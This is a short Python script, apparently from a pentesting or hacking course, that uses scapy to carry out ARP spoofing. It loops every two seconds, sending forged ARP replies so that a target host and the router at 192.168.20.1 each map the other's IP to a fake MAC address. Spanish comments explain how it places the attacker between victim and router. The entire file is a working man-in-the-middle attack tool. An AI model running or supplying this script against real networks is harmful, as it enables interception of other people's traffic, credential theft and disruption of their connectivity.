#!/usr/bin/env python3
import scapy.all as scapy
import argparse
import time

def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofer")
    parser.add_argument("-t", "--target", required=True, dest="ip_address", help="Host / IP Range to Spoof")

    return parser.parse_args()

def spoof(ip_address, spoof_ip):
    #op=2 se envia una respuesta y op=1 es una solicitud
    #Tenemos que marcar origen y destino con origen ip ruter y destino la ip de la maquina vulnerable y la mac que queremos que tenga el origen
    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address, hwsrc="aa:bb:cc:44:55:66")
    scapy.send(arp_packet, verbose=False)
    


def main():
    arguments = get_arguments()
    
    while True:
        # A la maquina objetivo le decimos que el ruter somos nosotros
        spoof(arguments.ip_address, "192.168.20.1")
        # Al rooter le decimos que la maquina victima somos nosotros
        spoof("192.168.20.1", arguments.ip_address)
        time.sleep(2)

if __name__ == '__main__':
    main()
